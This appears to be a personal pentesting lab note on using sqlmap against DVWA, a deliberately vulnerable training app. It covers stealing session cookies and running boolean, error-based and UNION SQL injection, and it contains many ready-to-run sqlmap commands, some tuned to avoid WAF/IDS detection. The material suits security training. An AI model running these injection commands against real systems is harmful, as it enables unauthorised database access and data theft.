# 01 - Exploit

Search Tag(s): #sql-injection #sqlmap #boolean-based #error-based #union #dvwa

TODO: Fill in the rest of the output when necessary - Userware

## 1.1 - Authenticate with Cookies

### 1.1.1 - Grab cookies from web console

To add cookies open the web console **`CTRL + SHIFT + K`** in Firefox. Then type `document.cookie` to copy the cookies to allow SQLMap to authenticate.

### 1.1.2 - Grab cookies from the network monitor

Open network monitor **`CTRL + SHIFT + E`** then refresh webpage. Click on the request with the current **Domain** you're targeting. It'll open request details from the right. In **Headers**, scroll down till you find **Request Headers**. Then copy the cookie HTTP header.

### 1.1.3 - Grab cookies from the storage

Open the storage **`SHIFT + F9`** in Firefox. Copy the **Name** and **Value** of the cookies.

Once you've retrieved the cookies pass the input with the flag `--cookies=PHPSESSID=<PHP_cookie_session_ID>;security=low`.

## 1.2 - Authentication methods without using cookies

### 1.2.1 - Direct connection to the database

If the DBMS backend has an exposed port when probing the server with `nmap` and you have credentials.

```
$ sqlmap -d "mysql://dvwa:"p@ssw0rd"@dvwa.local:3306/dvwa" -f --banner --dbs --users
```

## 1.3 - Specify Database Management System Backend

Force the DBMS to skip automatic enumeration using the flag `--dbms=mysql`.

```
$ sqlmap -u "http://dvwa.local/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie "PHPSESSID=<PHP_cookie_session_ID>; security=low" -p id --method="GET" --random-agent --dbms=mysql
```

## 1.4 - Specify Boundaries

You can specify the boundaries with flags `--prefix="'"` and `--suffix="#"` after performing manual enumeration in the [[02 - Craft Exploit#^a3394c|joining the query]] section.

```
$ sqlmap -u "http://dvwa.local/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie "PHPSESSID=<PHP_cookie_session>; security=low" -p id --method="GET" --random-agent --dbms=mysql --prefix="'" --suffix="#"
```

## 1.5 - SQL injection technique

SQLMap will automate by injecting queries of every possible techniques by default it uses `--technique=BEUSTQ` and it'll enumerate the DBMS server.

```
$ sqlmap -u "http://dvwa.local/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie "PHPSESSID=<PHP_cookie_session>; security=low" -p id --method="GET" --random-agent
```

You can specify SQL injection techniques. It also speeds up the process.

### 1.5.1 - Boolean-Based Query

We can also specify a [[02 - Craft Exploit|boolean-based blind]] query that can be used for bypassing form-based authentication. This requires you to understand how the backend works explained from [[07 - Tactics & Techniques & Procedures (TTPs) Phases/D - Webapp Pentesting/Injection/Server-Side Attack/SQL Injection/01 - In-Band SQL Injection/Attack Vectors/01 - DVWA/Manual/01 - Boolean-Based Query/01 - Blackbox Testing|blackbox testing]] section.

```
$ sqlmap -u "http://dvwa.local/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie "PHPSESSID=<PHP_cookie_session>; security=low" -p id --method="GET" --random-agent --dbms=mysql --prefix="'" --suffix="#" --technique=B
```

#### 1.5.1.1 - Page Comparison

To narrow it down even further we can filter it via `--test-filter` flag the SQL query payloads based on the XML tags contains title (`<title>`)  or payload name (`<payloads>`) which is located in `sqlmap/data/xml/payloads/` directory. We've crafted the payload with just the `OR` operator to [[02 - Craft Exploit#^9167dd|exploit]] it. We can exclude SQL queries using `--test-skip` to remove such operators that we haven't used like `NOT`. The valid response returns the output with all of the records. We'll append it with `--string=admin` as true. Finally we'll add `--code` to include the HTTP status code 200 response.

```
$ sqlmap -u "http://dvwa.local/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie "PHPSESSID=<PHP_cookie_session>; security=low" -p id --method="GET" --random-agent --dbms=mysql --prefix="'" --suffix="#" --technique=B --test-filter="OR boolean-based blind" --test-skip="NOT" --string="admin" --code="200"
```

Another option to consider for boolean-based SQL injection is when you encounter multiple data sets when returning a valid response when exploiting it. Use a regular expression flag `--regexp="(admin|Gordon|Brown|Hack|Me|Pablo|Picasso|Bob|Smith)"`.

```
$ sqlmap -u "http://dvwa.local/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie "PHPSESSID=<PHP_cookie_session>; security=low" -p id --method="GET" --random-agent --dbms=mysql --prefix="'" --suffix="#" --technique=B --test-filter="OR boolean-based blind" --test-skip="NOT" --regexp="(admin|Gordon|Brown|Hack|Me|Pablo|Picasso|Bob|Smith)" --code="200"
```

### 1.5.2 - Error-Based Query

- It's often referred as double query or subquery injection.

```
$ sqlmap -u "http://dvwa.local/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie "PHPSESSID=<PHP_cookie_session>; security=low" -p id --method="GET" --random-agent --dbms=mysql --prefix="'" --suffix="#" --technique=E
```

#### 1.5.2.1 - Invalidate Values

- Exceeding the boundary limits gives a room for our SQL injection process to avoid further overlaps for sqlmap to process the data quickly in a much cleaner data dump. [[02 - Craft Exploit#^33ca41|Exceeding the boundary limits]] using `--invalid-bignum`.

```
$ sqlmap -u "http://dvwa.local/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie "PHPSESSID=<PHP_cookie_session>; security=low" -p id --method="GET" --invalid-bignum --random-agent --dbms=mysql --prefix="'" --suffix="#" --technique=E
```

- Tamper the parameter with [[02 - Craft Exploit#^860e62|SQL operators]] using `--invalid-logical`.

```
$ sqlmap -u "http://dvwa.local/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie "PHPSESSID=<PHP_cookie_session>; security=low" -p id --method="GET" --invalid-logical --random-agent --dbms=mysql --prefix="'" --suffix="#" --technique=E
```

- Tamper the parameter with [[02 - Craft Exploit#^840ca1|random strings]] using `--invalid-string`.

```
$ sqlmap -u "http://dvwa.local/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie "PHPSESSID=<PHP_cookie_session>; security=low" -p id --method="GET" --invalid-string --random-agent --dbms=mysql --prefix="'" --suffix="#" --technique=E
```

### 1.5.3 - UNION Query

- It'll try to enumerate the fields automatically to get an exploit.

```
$ sqlmap -u "http://dvwa.local/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie "PHPSESSID=<PHP_cookie_session>; security=low" -p id --method="GET" --random-agent --dbms=mysql --prefix="'" --suffix="#" --technique=U
```

- You can specify number of columns after performing [[07 - Tactics & Techniques & Procedures (TTPs) Phases/D - Webapp Pentesting/Injection/Server-Side Attack/SQL Injection/01 - In-Band SQL Injection/Attack Vectors/01 - DVWA/Manual/02 - UNION Query/01 - Database Reconnaissance#^78ef92|fields enumeration]] with `--union-cols` flag.

```
$ sqlmap -u "http://dvwa.local/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie "PHPSESSID=<PHP_cookie_session>; security=low" -p id --method="GET" --random-agent --dbms=mysql --prefix="'" --suffix="#" --technique=U --union-cols=2
```

- By default when enumerating the number of fields it uses `NULL` character. In some instances that WAF/IDS might flag it. We can use `--union-char` with a random combination of characters.

```
$ sqlmap -u "http://dvwa.local/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie "PHPSESSID=<PHP_cookie_session>; security=low" -p id --method="GET" --random-agent --dbms=mysql --prefix="'" --suffix="#" --technique=U --union-cols=2 --union-char="1234567890"
```

- Some instances of DBMSes may require a valid table in order to proceed by exploiting the vulnerability. Especially when it comes to UNION technique we can use `--union-from` to specify the table `mysql.user` that comes by default in MySQL.

```
$ sqlmap -u "http://dvwa.local/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie "PHPSESSID=<PHP_cookie_session>; security=low" -p id --method="GET" --random-agent --dbms=mysql --prefix="'" --suffix="#" --technique=U --union-cols=2 --union-from=mysql.user
```

## 1.6 - Retrieve SQL statement

The `--statements` flag retrieves the SQL queries of how `sqlmap` was able to exploit the vulnerable backend webserver.

```
$ sqlmap -u "http://dvwa.local/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie "PHPSESSID=<PHP_cookie_session>; security=low" --random-agent --statements
```